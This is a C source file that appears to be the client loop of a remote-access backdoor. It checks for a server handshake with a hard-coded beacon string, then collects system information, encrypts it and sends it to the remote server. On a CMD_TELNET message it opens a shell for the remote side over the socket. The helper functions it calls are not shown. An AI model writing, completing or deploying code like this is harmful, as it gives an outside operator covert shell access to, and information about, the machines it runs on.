#include "unp.h"
#include "common.h"
#include "cmfc.h"

void cli_proc(int sockfd)
{
    int maxfdp1;
    fd_set rset;
    MSGINFO_S msgi;
    int shfdin;

    FD_ZERO(&rset);
    bzero(&msgi, sizeof(MSGINFO_S));
    for ( ; ; ) {
        FD_SET(sockfd, &rset);
        maxfdp1 = sockfd + 1;
        Select(maxfdp1, &rset, NULL, NULL, NULL);

        if (FD_ISSET(sockfd, &rset)) {
            if (Readn(sockfd, &msgi, sizeof(MSGINFO_S))==0) {
                err_quit("cli_proc: server terminated prematurely!");
            }
            
            char *beacon = "Jo*Po*Hello";
            if ((CMD_SHAKEHAND == msgi.msg_id) && (0 == strcmp(beacon, (char *)msgi.context))) {
                bzero(&msgi, sizeof(MSGINFO_S));
                bool res = fetch_sysinfo(&msgi);
                msgi.msg_id = CMD_SYSINFO;
                if (res) {
                    encrypt_buf((char *)&msgi, sizeof(MSGINFO_S));
                    Writen(sockfd, &msgi, sizeof(MSGINFO_S));
                }
            }
            else {
                decrypt_buf((char *)&msgi, sizeof(MSGINFO_S));
                printf("0x%02x\n", msgi.msg_id);

                switch (msgi.msg_id)
                {
                case CMD_TELNET:
                    startshell(sockfd, &shfdin);
                    break;

                case CMD_COMMOND:
                    
                    break;
                
                default:
                    break;
                }

            }
        }
    }
}